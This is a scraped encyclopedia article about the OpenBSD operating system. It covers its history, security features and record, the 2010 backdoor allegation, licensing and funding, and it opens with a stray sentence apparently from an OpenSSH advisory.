Once again we thank OpenSSH's developers for their outstanding work and
for their implementation of these defense-in-depth mechanisms (privilege
separation, sandboxing) that make it so much harder to exploit such a
vulnerability.

Not to be confused with [FreeBSD](/wiki/FreeBSD "FreeBSD").

**OpenBSD** is a [security-focused](/wiki/Security-focused_operating_system "Security-focused operating system"), [free software](/wiki/Free_software "Free software"), [Unix-like](/wiki/Unix-like "Unix-like") [operating system](/wiki/Operating_system "Operating system") based on the [Berkeley Software Distribution](/wiki/Berkeley_Software_Distribution "Berkeley Software Distribution") (BSD). [Theo de Raadt](/wiki/Theo_de_Raadt "Theo de Raadt") created OpenBSD in 1995 by [forking](/wiki/Fork_%28software_development%29 "Fork (software development)") [NetBSD](/wiki/NetBSD "NetBSD") 1.0.[[4]](#cite_note-coremail-4) The OpenBSD project emphasizes [portability](/wiki/Software_portability "Software portability"), [standardization](/wiki/Software_standard "Software standard"), [correctness](/wiki/Software_bug "Software bug"), proactive [security](/wiki/Computer_security "Computer security"), and integrated [cryptography](/wiki/Cryptography "Cryptography").[[5]](#cite_note-5)

The OpenBSD project maintains portable versions of many subsystems as [packages](/wiki/Package_manager "Package manager") for other operating systems. Because of the project's preferred BSD license, which allows binary redistributions without the source code, many components are reused in proprietary and corporate-sponsored software projects. The [firewall](/wiki/Firewall_%28computing%29 "Firewall (computing)") code in [Apple](/wiki/Apple_Inc. "Apple Inc.")'s [macOS](/wiki/MacOS "MacOS") is based on OpenBSD's [PF](/wiki/PF_%28firewall%29 "PF (firewall)") firewall code,[[6]](#cite_note-6) [Android](/wiki/Android_%28operating_system%29 "Android (operating system)")'s [Bionic](/wiki/Bionic_%28software%29 "Bionic (software)") [C standard library](/wiki/C_standard_library "C standard library") is based on OpenBSD code,[[7]](#cite_note-7) [LLVM](/wiki/LLVM "LLVM") uses OpenBSD's [regular expression](/wiki/Regular_expression "Regular expression") library,[[8]](#cite_note-8) and [Windows 10](/wiki/Windows_10 "Windows 10") uses [OpenSSH](/wiki/OpenSSH "OpenSSH") (OpenBSD Secure Shell) with [LibreSSL](/wiki/LibreSSL "LibreSSL").[[9]](#cite_note-9)

The word "open" in the name OpenBSD refers to the availability of the operating system [source code](/wiki/Source_code "Source code") on the [Internet](/wiki/Internet "Internet"), although the word "open" in the name OpenSSH means "OpenBSD". It also refers to the wide range of [hardware platforms](/wiki/Computer_architecture "Computer architecture") the system supports.[[10]](#cite_note-infoworld_new_years_resolution-10) OpenBSD supports a variety of system architectures including [x86-64](/wiki/X86-64 "X86-64"), [IA-32](/wiki/IA-32 "IA-32"), [ARM](/wiki/ARM_architecture_family "ARM architecture family"), [PowerPC](/wiki/PowerPC "PowerPC"), and 64-bit [RISC-V](/wiki/RISC-V "RISC-V").

## History

[edit](/w/index.php?title=OpenBSD&action=edit&section=1 "Edit section: History")

In December 1994, [Theo de Raadt](/wiki/Theo_de_Raadt "Theo de Raadt"), a founding member of the [NetBSD](/wiki/NetBSD "NetBSD") project, was asked to resign from the NetBSD core team over disagreements and conflicts with the other members of the NetBSD team.[[11]](#cite_note-glass-11)[[4]](#cite_note-coremail-4) In October 1995, De Raadt founded OpenBSD, a new project forked from NetBSD 1.0. The initial release, OpenBSD 1.2, was made in July 1996, followed by OpenBSD 2.0 in October of the same year.[[12]](#cite_note-2.0-release-12) Since then, the project has issued a release every six months, each of which is supported for one year.

On 25 July 2007, OpenBSD developer Bob Beck announced the formation of the [OpenBSD Foundation](/wiki/OpenBSD_Foundation "OpenBSD Foundation"), a Canadian non-profit organization formed to "act as a single point of contact for persons and organizations requiring a legal entity to deal with when they wish to support OpenBSD."[[13]](#cite_note-announcing-openbsd-foundation-13)

In 2024, it announced that the project has modified all files since the original import.[[14]](#cite_note-14)

## Usage statistics

[edit](/w/index.php?title=OpenBSD&action=edit&section=2 "Edit section: Usage statistics")

[![](//upload.wikimedia.org/wikipedia/commons/thumb/6/66/Bsd_distributions_usage.svg/170px-Bsd_distributions_usage.svg.png)](/wiki/File%3ABsd_distributions_usage.svg)

[Bar chart](/wiki/Bar_chart "Bar chart") showing the proportion of users of each [BSD](/wiki/Berkeley_Software_Distribution "Berkeley Software Distribution") variant from a 2005 BSD usage survey of 4330 users.[[15]](#cite_note-survey-15)[[note 1]](#cite_note-survey_nuance-16)

It is hard to determine how widely OpenBSD is used, because the developers do not publish or collect usage statistics.

In September 2005, the BSD Certification Group surveyed 4330 individual BSD users, showing that 32.8% used OpenBSD,[[15]](#cite_note-survey-15) behind [FreeBSD](/wiki/FreeBSD "FreeBSD") with 77%, ahead of NetBSD with 16.3% and [DragonFly BSD](/wiki/DragonFly_BSD "DragonFly BSD") with 2.6%[[note 1]](#cite_note-survey_nuance-16). However, the authors of this survey clarified that it is neither "exhaustive" nor "completely accurate", since the survey was spread mainly through mailing lists, forums and word of mouth. This combined with other factors, like the lack of a control group, a pre-screening process or significant outreach outside of the BSD community, makes the survey unreliable for judging BSD usage globally.

## Uses

[edit](/w/index.php?title=OpenBSD&action=edit&section=3 "Edit section: Uses")

### Network appliances

[edit](/w/index.php?title=OpenBSD&action=edit&section=4 "Edit section: Network appliances")

OpenBSD features a robust [TCP/IP](/wiki/TCP/IP "TCP/IP") [networking](/wiki/Computer_network "Computer network") stack, and can be used as a [router](/wiki/Router_%28computing%29 "Router (computing)")[[16]](#cite_note-17) or [wireless access point](/wiki/Wireless_access_point "Wireless access point").[[17]](#cite_note-18) OpenBSD's [security enhancements](/wiki/OpenBSD_security_features "OpenBSD security features"), built-in [cryptography](/wiki/Cryptography "Cryptography"), and [packet filter](/wiki/PF_%28firewall%29 "PF (firewall)") make it suitable for security purposes such as [firewalls](/wiki/Firewall_%28computing%29 "Firewall (computing)"),[[18]](#cite_note-closer-look-openbsd-19) [intrusion-detection systems](/wiki/Intrusion-detection_system "Intrusion-detection system"), and [VPN](/wiki/Virtual_private_network "Virtual private network") [gateways](/wiki/Gateway_%28computer_networking%29 "Gateway (computer networking)").

Several [proprietary](/wiki/Proprietary_software "Proprietary software") systems are based on OpenBSD, including devices from [Armorlogic](/w/index.php?title=Armorlogic&action=edit&redlink=1 "Armorlogic (page does not exist)") (Profense web application firewall), Calyptix Security,[[19]](#cite_note-calyptix-20) GeNUA,[[20]](#cite_note-genua-21) RTMX,[[21]](#cite_note-rtmx-22) and .vantronix.[[22]](#cite_note-vantronix-23)

### Other operating systems

[edit](/w/index.php?title=OpenBSD&action=edit&section=5 "Edit section: Other operating systems")

Some versions of [Microsoft](/wiki/Microsoft "Microsoft")'s [Services for UNIX](/wiki/Windows_Services_for_UNIX "Windows Services for UNIX"), an extension to the [Windows](/wiki/Microsoft_Windows "Microsoft Windows") operating system to provide Unix-like functionality, use much of the OpenBSD code base that is included in the [Interix](/wiki/Interix "Interix") interoperability suite,[[23]](#cite_note-wsu35_review-24)[[24]](#cite_note-wontfix-25) developed by Softway Systems Inc., which Microsoft acquired in 1999.[[25]](#cite_note-softway-26)[[26]](#cite_note-interix-27) Core Force, a security product for Windows, is based on OpenBSD's [pf firewall](/wiki/PF_%28firewall%29 "PF (firewall)").[[27]](#cite_note-core-force-28) The [pf firewall](/wiki/PF_%28firewall%29 "PF (firewall)") is also found in other operating systems: including [FreeBSD](/wiki/FreeBSD "FreeBSD"),[[28]](#cite_note-29) and [macOS](/wiki/MacOS "MacOS").[[29]](#cite_note-30)

### Personal computers

[edit](/w/index.php?title=OpenBSD&action=edit&section=6 "Edit section: Personal computers")

OpenBSD ships with [Xenocara](/wiki/Xenocara "Xenocara"),[[30]](#cite_note-xenocara-31) an implementation of the [X Window System](/wiki/X_Window_System "X Window System"), and is suitable as a desktop operating system for [personal computers](/wiki/Personal_computer "Personal computer"), including laptops.[[31]](#cite_note-openbsd-desktop-32)[[32]](#cite_note-absolute_openbsd-33): xl As of September 2018[[update]](https://en.wikipedia.org/w/index.php?title=OpenBSD&action=edit), OpenBSD includes approximately 8000 packages in its [software repository](/wiki/Software_repository "Software repository"),[[33]](#cite_note-openports-34) including desktop environments such as [Lumina](/wiki/Lumina_%28desktop_environment%29 "Lumina (desktop environment)"), [GNOME](/wiki/GNOME "GNOME"), [KDE Plasma](/wiki/KDE_Plasma "KDE Plasma"), and [Xfce](/wiki/Xfce "Xfce"), and web browsers such as [Firefox](/wiki/Firefox "Firefox") and [Chromium](/wiki/Chromium_%28web_browser%29 "Chromium (web browser)").[[34]](#cite_note-6.0-release-35) The project also includes three window managers in the main distribution: [cwm](/wiki/Cwm_%28window_manager%29 "Cwm (window manager)"), [FVWM](/wiki/FVWM "FVWM") (part of the default configuration for Xenocara), and [twm](/wiki/Twm "Twm").[[35]](#cite_note-faq11-36)

### Servers

[edit](/w/index.php?title=OpenBSD&action=edit&section=7 "Edit section: Servers")

OpenBSD features a full [server](/wiki/Server_%28computing%29 "Server (computing)") suite and can be configured as a [mail server](/wiki/Mail_server "Mail server"), [web server](/wiki/Web_server "Web server"), [FTP server](/wiki/FTP_server "FTP server"), [DNS server](/wiki/DNS_server "DNS server"), [router](/wiki/Router_%28computing%29 "Router (computing)"), [firewall](/wiki/Firewall_%28computing%29 "Firewall (computing)"), [NFS](/wiki/Network_File_System "Network File System") [file server](/wiki/File_server "File server"), or any combination of these. Since version 6.8, OpenBSD has also shipped with native in-kernel [WireGuard](/wiki/WireGuard "WireGuard") support.[[36]](#cite_note-37)[[37]](#cite_note-38)

## Security

[![](//upload.wikimedia.org/wikipedia/commons/thumb/6/69/OpenBSD_7.0_console_screenshot.png/220px-OpenBSD_7.0_console_screenshot.png)](/wiki/File%3AOpenBSD_7.0_console_screenshot.png)

OpenBSD console login and its messages

Shortly after OpenBSD was created, De Raadt was contacted by a local security software company named Secure Networks (later acquired by [McAfee](/wiki/McAfee "McAfee")).[[38]](#cite_note-staying-cutting-edge-39)[[39]](#cite_note-onlamp-interview-40) The company was developing a [network security](/wiki/Network_security "Network security") auditing tool called Ballista,[[note 2]](#cite_note-ballista-41) which was intended to find and [exploit](/wiki/Exploit_%28computer_security%29 "Exploit (computer security)") software security flaws. This coincided with De Raadt's interest in security, so the two cooperated leading up to the release of OpenBSD 2.3.[[40]](#cite_note-2.3-announcement-42) This collaboration helped to define security as the focus of the OpenBSD project.[[41]](#cite_note-free-for-all-43)

OpenBSD includes numerous features designed to improve security, such as:

* Secure alternatives to [POSIX](/wiki/POSIX "POSIX") functions in the C standard library, such as `[strlcat](/wiki/Strlcat "Strlcat")` for `[strcat](/wiki/Strcat "Strcat")` and `[strlcpy](/wiki/Strlcpy "Strlcpy")` for `[strcpy](/wiki/Strcpy "Strcpy")`[[42]](#cite_note-strlcpy-strlcat-paper-44)
* Toolchain alterations, including a [static bounds checker](/wiki/Static_code_analysis "Static code analysis")[[43]](#cite_note-man_gcc-local-45)
* Memory protection techniques to guard against invalid accesses, such as [ProPolice](/wiki/Stack-smashing_protection#GCC_Stack-Smashing_Protector_(ProPolice) "Stack-smashing protection") and the [W^X](/wiki/W%5EX "W^X") [page](/wiki/Paging "Paging") protection feature
* Strong [cryptography](/wiki/Cryptography "Cryptography") and [randomization](/wiki/Randomization "Randomization")[[44]](#cite_note-crypto-openbsd-overview-46)
* [System call](/wiki/System_call "System call") and [filesystem](/wiki/Filesystem "Filesystem") access restrictions to limit process capabilities[[45]](#cite_note-47)

To reduce the risk of a vulnerability or misconfiguration allowing [privilege escalation](/wiki/Privilege_escalation "Privilege escalation"), many programs have been written or adapted to make use of [privilege separation](/wiki/Privilege_separation "Privilege separation"), [privilege revocation](/wiki/Privilege_revocation_%28computing%29 "Privilege revocation (computing)") and [chrooting](/wiki/Chroot "Chroot"). Privilege separation is a technique, pioneered on OpenBSD and inspired by the [principle of least privilege](/wiki/Principle_of_least_privilege "Principle of least privilege"), where a program is split into two or more parts, one of which performs privileged operations and the other—almost always the bulk of the code—runs without privilege.[[46]](#cite_note-privilege-separated-openssh-48) Privilege revocation is similar and involves a program performing any necessary operations with the privileges it starts with then dropping them. Chrooting involves restricting an application to one section of the [file system](/wiki/File_system "File system"), prohibiting it from accessing areas that contain private or system files. Developers have applied these enhancements to OpenBSD versions of many common applications, such as [tcpdump](/wiki/Tcpdump "Tcpdump"), [file](/wiki/File_%28command%29 "File (command)"), [tmux](/wiki/Tmux "Tmux"), [smtpd](/wiki/OpenSMTPD "OpenSMTPD"), and [syslogd](/wiki/Syslogd "Syslogd").[[47]](#cite_note-openbsd_innovations_privsep-49)

OpenBSD developers were instrumental in the creation and development of [OpenSSH](/wiki/OpenSSH "OpenSSH") (aka OpenBSD Secure Shell), which is developed in the OpenBSD CVS repositories. OpenBSD Secure Shell is based on the original [SSH](/wiki/Secure_Shell "Secure Shell").[[48]](#cite_note-openssh-history-50) It first appeared in OpenBSD 2.6 and is now by far the most popular SSH client and server, available on many operating systems.[[49]](#cite_note-openssh-usage-51)

The project has a policy of continually auditing source code for problems, work that developer Marc Espie has described as "never finished ... more a question of process than of a specific bug being hunted." He went on to list several typical steps once a bug is found, including examining the entire source tree for the same and similar issues, "try[ing] to find out whether the documentation ought to be amended", and investigating whether "it's possible to augment the [compiler](/wiki/Compiler "Compiler") to warn against this specific problem."[[50]](#cite_note-interview-espie-52)

### Security record

[edit](/w/index.php?title=OpenBSD&action=edit&section=9 "Edit section: Security record")

The OpenBSD website features a prominent reference to the system's security record. Until June 2002, it read:

> Five years without a remote hole in the default install!

In June 2002, Mark Dowd of [Internet Security Systems](/wiki/Internet_Security_Systems "Internet Security Systems") disclosed a bug in the OpenSSH code implementing [challenge–response authentication](/wiki/Challenge%E2%80%93response_authentication "Challenge–response authentication").[[51]](#cite_note-53) This [vulnerability](/wiki/Vulnerability_%28computer_science%29 "Vulnerability (computer science)") in the OpenBSD default installation allowed an attacker remote access to the [root](/wiki/Superuser "Superuser") account, which was extremely serious not only to OpenBSD, but also to the large number of other operating systems that were using OpenSSH by that time.[[52]](#cite_note-54) This problem necessitated the adjustment of the slogan on the OpenBSD website to:

> One remote hole in the default install, in nearly 6 years!

The quote remained unchanged as time passed, until on 13 March 2007, when Alfredo Ortega of Core Security Technologies disclosed a network-related remote vulnerability.[[53]](#cite_note-55) The quote was subsequently changed to:

> Only two remote holes in the default install, in a heck of a long time!

This statement has been criticized because the default install contains few running services, and many use cases require additional services.[[54]](#cite_note-56) Also, because the ports tree contains unaudited [third-party software](/wiki/Third-party_software "Third-party software"), it is easy for users to compromise security by installing or improperly configuring packages. However, the project maintains that the slogan is *intended* to refer to a default install and that it is correct by that measure.

One of the fundamental ideas behind OpenBSD is a drive for systems to be simple, clean, and secure by default. The default install is quite minimal, which the project states is to ensure novice users "do not need to become security experts overnight",[[55]](#cite_note-security-57) which fits with open-source and [code auditing](/wiki/Code_audit "Code audit") practices considered important elements of a security system.[[56]](#cite_note-oss-good-for-security-58) Additional services are to be enabled manually to make users think of the security implications first.

### Alleged backdoor

[edit](/w/index.php?title=OpenBSD&action=edit&section=10 "Edit section: Alleged backdoor")

On 11 December 2010, Gregory Perry, a former technical consultant for the [Federal Bureau of Investigation](/wiki/Federal_Bureau_of_Investigation "Federal Bureau of Investigation") (FBI), emailed De Raadt alleging that the FBI had paid some OpenBSD ex-developers 10 years prior to insert backdoors into the [OpenBSD Cryptographic Framework](/wiki/OpenBSD_Cryptographic_Framework "OpenBSD Cryptographic Framework"). De Raadt made the email public on 14 December by forwarding it to the openbsd-tech mailing list and suggested an audit of the [IPsec](/wiki/IPsec "IPsec") codebase.[[57]](#cite_note-allegations-ipsec-59)[[58]](#cite_note-osnews-ipsec-60) De Raadt's response was skeptical of the report and he invited all developers to independently review the relevant code. In the weeks that followed, bugs were fixed but no evidence of backdoors was found.[[59]](#cite_note-no-ipsec-backdoor-61) De Raadt stated "I believe that NetSec was probably contracted to write backdoors as alleged. If those were written, I don't believe they made it into our tree. They might have been deployed as their own product."[[60]](#cite_note-informationweek_ipsec-62)

### Criticisms

[edit](/w/index.php?title=OpenBSD&action=edit&section=11 "Edit section: Criticisms")

In December 2017, Ilja van Sprundel, director at [IOActive](/wiki/IOActive "IOActive"), gave a talk at the [CCC](/wiki/Chaos_Communication_Congress "Chaos Communication Congress")[[61]](#cite_note-63) as well as [DEF CON](/wiki/DEF_CON "DEF CON"),[[62]](#cite_note-64) entitled "Are all BSDs created equally? — A survey of BSD kernel vulnerabilities", in which he stated that although OpenBSD was the clear winner of the BSDs in terms of security, "Bugs are still easy to find in those kernels, even in OpenBSD".

Two years later, in 2019, a talk named "A systematic evaluation of OpenBSD's mitigations" was given[[63]](#cite_note-65) at the CCC, arguing that while OpenBSD has some effective mitigations, a significant part of them are "useless at best and based on pure luck and superstition", arguing for a more rational approach when it comes to designing them.[[64]](#cite_note-66)

## Subprojects

[edit](/w/index.php?title=OpenBSD&action=edit&section=12 "Edit section: Subprojects")

Many open source projects started as components of OpenBSD, including:

Some subsystems have been integrated into other BSD operating systems,[[73]](#cite_note-freebsd_openssh-base-75)[[74]](#cite_note-netbsd_openssh-base-76)[[75]](#cite_note-dragonflybsd_openssh-base-77) and many are available as packages for use in other Unix-like systems.[[76]](#cite_note-archlinux_openssh-portable-78)[[77]](#cite_note-opensuse_openssh-portable-79)[[78]](#cite_note-debian_openssh-portable-80)

Linux administrator Carlos Fenollosa commented on moving from Linux to OpenBSD that the system is faithful to the [Unix philosophy](/wiki/Unix_philosophy "Unix philosophy") of small, simple tools that work together well: "Some base components are not as feature-rich, on purpose. Since 99% of the servers don't need the flexibility of Apache, OpenBSD's httpd will work fine, be more secure, and probably faster".[[79]](#cite_note-Fenollosa-81) He characterized the developer community's attitude to components as: "When the community decides that some module sucks, they develop a new one from scratch. OpenBSD has its own NTPd, SMTPd and, more recently, HTTPd. They work great".[[79]](#cite_note-Fenollosa-81) As a result, OpenBSD is relatively prolific in creating components that become widely reused by other systems.

OpenBSD runs nearly all of its standard [daemons](/wiki/Daemon_%28computing%29 "Daemon (computing)") within [chroot](/wiki/Chroot "Chroot") and [privsep](/wiki/Privilege_separation "Privilege separation") security structures by default, as part of hardening the base system.[[79]](#cite_note-Fenollosa-81)

The [Calgary Internet Exchange](/wiki/Calgary_Internet_Exchange "Calgary Internet Exchange") was formed in 2012, in part to serve the needs of the OpenBSD project.[[80]](#cite_note-cuug-82)

In 2017, Isotop,[[81]](#cite_note-83) a French project aiming to adapt OpenBSD to desktops and laptops, using [xfce](/wiki/Xfce "Xfce") then [dwm](/wiki/Dwm "Dwm"), started to be developed.[[82]](#cite_note-84)

## Third-party components

[edit](/w/index.php?title=OpenBSD&action=edit&section=13 "Edit section: Third-party components")

OpenBSD includes a number of [third-party components](/wiki/Third-party_software_component "Third-party software component"), many with OpenBSD-specific patches,[[34]](#cite_note-6.0-release-35) such as [X.Org](/wiki/X.Org_Server "X.Org Server"), [Clang](/wiki/Clang "Clang")[[83]](#cite_note-man_clang-local-85) (the default [compiler](/wiki/Compiler "Compiler") on several [architectures](/wiki/Computer_architecture "Computer architecture")), [GCC](/wiki/GNU_Compiler_Collection "GNU Compiler Collection"),[[43]](#cite_note-man_gcc-local-45)[[note 3]](#cite_note-compiler-version-86) [Perl](/wiki/Perl "Perl"), [NSD](/wiki/NSD "NSD"), [Unbound](/wiki/Unbound_%28DNS_server%29 "Unbound (DNS server)"), [ncurses](/wiki/Ncurses "Ncurses"), [GNU binutils](/wiki/GNU_binutils "GNU binutils"), [GDB](/wiki/GNU_Debugger "GNU Debugger"), and [AWK](/wiki/AWK "AWK").

OpenBSD hackathon s2k17

Development is continuous, and team management is open and tiered. Anyone with appropriate skills may contribute, with commit rights being awarded on merit and De Raadt acting as coordinator.[[32]](#cite_note-absolute_openbsd-33): xxxv Two official releases are made per year, with the version number incremented by 0.1,[[84]](#cite_note-deraadt_interview_200605-87) and these are each supported for twelve months (two release cycles).[[85]](#cite_note-openbsd_faq_building_system_source-88) Snapshot releases are also available at frequent intervals.

Maintenance patches for supported releases may be applied using [syspatch](/w/index.php?title=Syspatch&action=edit&redlink=1 "Syspatch (page does not exist)"), manually or by updating the system against the patch branch of the [CVS](/wiki/Concurrent_Versions_System "Concurrent Versions System") source repository for that release.[[86]](#cite_note-openbsd_faq_system_management-89) Alternatively, a system administrator may opt to upgrade to the next snapshot release using [sysupgrade](/w/index.php?title=Sysupgrade&action=edit&redlink=1 "Sysupgrade (page does not exist)"), or by using the -current branch of the CVS repository, in order to gain pre-release access to recently added features. The sysupgrade tool can also upgrade to the latest stable release version.

The generic OpenBSD kernel provided by default is strongly recommended for end users, in contrast to operating systems that recommend user kernel customization.[[87]](#cite_note-faq9-90)

Packages outside the base system are maintained by CVS through a [ports tree](/wiki/Ports_collection "Ports collection") and are the responsibility of the individual maintainers, known as porters. As well as keeping the current branch up to date, porters are expected to apply appropriate bug-fixes and maintenance fixes to branches of their package for OpenBSD's supported releases. Ports are generally not subject to the same continuous auditing as the base system due to lack of manpower.

Binary packages are built centrally from the ports tree for each architecture. This process is applied for the current version, for each supported release, and for each snapshot. Administrators are recommended to use the package mechanism rather than build the package from the ports tree, unless they need to perform their own source changes.

OpenBSD's developers regularly meet at special events called [hackathons](/wiki/Hackathon "Hackathon"),[[88]](#cite_note-openbsd-hackathons-91) where they "sit down and code", emphasizing productivity.[[89]](#cite_note-deraadt_interview_200603-92)

Most new releases include a song.[[90]](#cite_note-lyrics-93)

## Open source and open documentation

[edit](/w/index.php?title=OpenBSD&action=edit&section=15 "Edit section: Open source and open documentation")

OpenBSD is known for its high-quality documentation.[[91]](#cite_note-chisnall2006-94)[[92]](#cite_note-smith2013-95)

When OpenBSD was created, De Raadt decided that the [source code](/wiki/Source_code "Source code") should be available for anyone to read. At the time, a small team of developers generally had access to a project's source code.[[93]](#cite_note-cvs-96) Chuck Cranor[[94]](#cite_note-cranor-97) and De Raadt concluded this practice was "counter to the open source philosophy" and inconvenient to potential contributors. Together, Cranor and De Raadt set up the first public, anonymous [revision control system](/wiki/Revision_control_system "Revision control system") server. De Raadt's decision allowed users to "take a more active role", and established the project's commitment to open access.[[93]](#cite_note-cvs-96) OpenBSD is notable for its continued use of [CVS](/wiki/Concurrent_Versions_System "Concurrent Versions System") (more precisely an unreleased, OpenBSD-managed fork named OpenCVS), when most other projects that used it have migrated to other systems.[[95]](#cite_note-98)

OpenBSD does not include [closed source](/wiki/Closed_source "Closed source") binary drivers in the source tree, nor does it include code requiring the signing of [non-disclosure agreements](/wiki/Non-disclosure_agreement "Non-disclosure agreement").[[96]](#cite_note-openbsd_goals_code-99) According to the [GNU Project](/wiki/GNU_Project "GNU Project"), OpenBSD includes small "blobs" of proprietary object code as device firmware.[[97]](#cite_note-100)

Since OpenBSD is based in Canada, no United States export restrictions on cryptography apply, allowing the distribution to make full use of modern algorithms for encryption. For example, the swap space is divided into small sections and each section is encrypted with its own key, ensuring that sensitive data does not leak into an insecure part of the system.[[18]](#cite_note-closer-look-openbsd-19)

OpenBSD randomizes various behaviors of applications, making them less predictable and thus more difficult to attack. For example, PIDs are created and associated randomly to processes; the `bind` [system call](/wiki/System_call "System call") uses random [port numbers](/wiki/Port_%28computer_networking%29 "Port (computer networking)"); files are created with random [inode](/wiki/Inode "Inode") numbers; and IP datagrams have random identifiers.[[98]](#cite_note-crypto-openbsd-overview_randomness-101) This approach also helps expose bugs in the kernel and in user space programs.

The OpenBSD policy on openness extends to hardware documentation: in the slides for a December 2006 presentation, De Raadt explained that without it "developers often make mistakes writing drivers", and pointed out that "the [oh my god, I got it to work] rush is harder to achieve, and some developers just give up."[[99]](#cite_note-deraadtopencon06-102) He went on to say that vendor-supplied binary drivers are unacceptable for inclusion in OpenBSD, that they have "no trust of vendor binaries running in our kernel" and that there is "no way to fix [them] ... when they break."[[99]](#cite_note-deraadtopencon06-102)

## Licensing

[edit](/w/index.php?title=OpenBSD&action=edit&section=16 "Edit section: Licensing")

See also: [Comparison of free and open-source software licenses](/wiki/Comparison_of_free_and_open-source_software_licenses "Comparison of free and open-source software licenses") and [Free software license](/wiki/Free_software_license "Free software license")

OpenBSD maintains a strict [license](/wiki/Software_licensing "Software licensing") policy,[[3]](#cite_note-policy-3) preferring the [ISC license](/wiki/ISC_license "ISC license") and other variants of the [BSD license](/wiki/Simplified_BSD_License "Simplified BSD License"). The project attempts to "maintain the spirit of the original Berkeley Unix [copyrights](/wiki/Copyright "Copyright")," which permitted a "relatively un-encumbered Unix source distribution."[[3]](#cite_note-policy-3) The widely used [Apache License](/wiki/Apache_License "Apache License") and [GNU General Public License](/wiki/GNU_General_Public_License "GNU General Public License") are considered overly restrictive.[[100]](#cite_note-bsd-cognoscenti-on-linux-103)

In June 2001, triggered by concerns over Darren Reed's modification of IPFilter's license wording, a systematic license audit of the OpenBSD ports and source trees was undertaken.[[101]](#cite_note-license-disagreement-104) Code in more than a hundred files throughout the system was found to be unlicensed, ambiguously licensed or in use against the terms of the license. To ensure that all licenses were properly adhered to, an attempt was made to contact all the relevant copyright holders: some pieces of code were removed, many were replaced, and others, such as the [multicast](/wiki/Multicast "Multicast") [routing](/wiki/Routing "Routing") tools mrinfo and map-mbone, were [relicensed](/wiki/Software_relicensing "Software relicensing") so that OpenBSD could continue to use them.[[102]](#cite_note-cvsweb_mrinfo_xerox-105)[[103]](#cite_note-cvsweb_map-mbone_xerox-106) Also removed during this audit was all software produced by [Daniel J. Bernstein](/wiki/Daniel_J._Bernstein "Daniel J. Bernstein"). At the time, Bernstein requested that all modified versions of his code be approved by him prior to redistribution, a requirement to which OpenBSD developers were unwilling to devote time or effort.[[104]](#cite_note-djb-ports-removed-1-107)[[105]](#cite_note-djb-ports-removed-2-108)[[106]](#cite_note-djb-ports-removed-3-109)

Because of licensing concerns, the OpenBSD team has reimplemented software from scratch or adopted suitable existing software. For example, OpenBSD developers created the [PF](/wiki/PF_%28firewall%29 "PF (firewall)") [packet filter](/wiki/Packet_filter "Packet filter") after unacceptable restrictions were imposed on [IPFilter](/wiki/IPFilter "IPFilter"). PF first appeared in OpenBSD 3.0[[107]](#cite_note-pf-design-paper-110) and is now available in many other operating systems.[[108]](#cite_note-pf-book-111) OpenBSD developers have also replaced GPL-licensed tools (such as [CVS](/wiki/Concurrent_Versions_System "Concurrent Versions System") and [pkg-config](/wiki/Pkg-config "Pkg-config")) with [permissively licensed](/wiki/Permissive_software_license "Permissive software license") equivalents.[[109]](#cite_note-112)[[110]](#cite_note-113)

## Funding

[edit](/w/index.php?title=OpenBSD&action=edit&section=17 "Edit section: Funding")

Although the operating system and its portable components are used in commercial products, De Raadt says that little of the funding for the project comes from the industry: "traditionally all our funding has come from user donations and users buying our CDs (our other products don't really make us much money). Obviously, that has not been a lot of money."[[84]](#cite_note-deraadt_interview_200605-87)

For a two-year period in the early 2000s, the project received funding from [DARPA](/wiki/DARPA "DARPA"), which "paid the salaries of 5 people to work completely full-time, bought about $30k in hardware, and paid for 3 hackathons", from the [POSSE project](/wiki/POSSE_project "POSSE project").[[84]](#cite_note-deraadt_interview_200605-87)

In 2006, the OpenBSD project experienced financial difficulties.[[111]](#cite_note-slashdot_financial_danger-114) The [Mozilla Foundation](/wiki/Mozilla_Foundation "Mozilla Foundation")[[112]](#cite_note-slashdot_mozilla_donate-115) and [GoDaddy](/wiki/GoDaddy "GoDaddy")[[113]](#cite_note-thehostingnews_godaddy_donate-116) are among the organizations that helped OpenBSD to survive. However, De Raadt expressed concern about the asymmetry of funding: "I think that contributions should have come first from the vendors, secondly from the corporate users, and thirdly from individual users. But the response has been almost entirely the opposite, with almost a 15-to-1 dollar ratio in favor of the little people. Thanks a lot, little people!"[[84]](#cite_note-deraadt_interview_200605-87)

On 14 January 2014, Bob Beck issued a request for funding to cover electrical costs. If sustainable funding was not found, Beck suggested the OpenBSD project would shut down.[[114]](#cite_note-funding-2014-117) The project soon received a US$20,000 donation from Mircea Popescu, the Romanian creator of the MPEx bitcoin stock exchange, paid in [bitcoins](/wiki/Bitcoin "Bitcoin").[[115]](#cite_note-Bright-118) The project raised US$150,000[[116]](#cite_note-2014_fundraising_campaign-119) in response to the appeal, enabling it to pay its bills and securing its short-term future.[[115]](#cite_note-Bright-118)

### OpenBSD Foundation

[edit](/w/index.php?title=OpenBSD&action=edit&section=18 "Edit section: OpenBSD Foundation")

OpenBSD Foundation
| Formation | July 25, 2007; 17 years ago (2007-07-25) |
| --- | --- |
| Founder | OpenBSD developers |
| Legal status | [Nonprofit organization](/wiki/Nonprofit_organization "Nonprofit organization") |
| Location | * [Canada](/wiki/Canada "Canada") |
| Website | [www.openbsdfoundation.org](https://www.openbsdfoundation.org) |

|  | |

The OpenBSD Foundation is a Canadian federal [non-profit organization](/wiki/Non-profit_organization "Non-profit organization") founded by the OpenBSD project as a "[single point of contact](/wiki/Single_point_of_contact "Single point of contact") for persons and organizations requiring a legal entity to deal with when they wish to support OpenBSD."[[117]](#cite_note-120) It was announced to the public by OpenBSD developer Bob Beck on 25 July 2007. It also serves as a legal safeguard over other projects which are affiliated with OpenBSD, including [OpenSSH](/wiki/OpenSSH "OpenSSH"), [OpenBGPD](/wiki/OpenBGPD "OpenBGPD"), [OpenNTPD](/wiki/OpenNTPD "OpenNTPD"), [OpenCVS](/wiki/OpenCVS "OpenCVS"), [OpenSMTPD](/wiki/OpenSMTPD "OpenSMTPD") and [LibreSSL](/wiki/LibreSSL "LibreSSL").[[118]](#cite_note-121)

Since 2014, several large contributions to the OpenBSD Foundation have come from corporations such as Microsoft,[[119]](#cite_note-register_rain_cash-122) Facebook, and Google as well as the [Core Infrastructure Initiative](/wiki/Core_Infrastructure_Initiative "Core Infrastructure Initiative").[[120]](#cite_note-foundation_contributors-123)

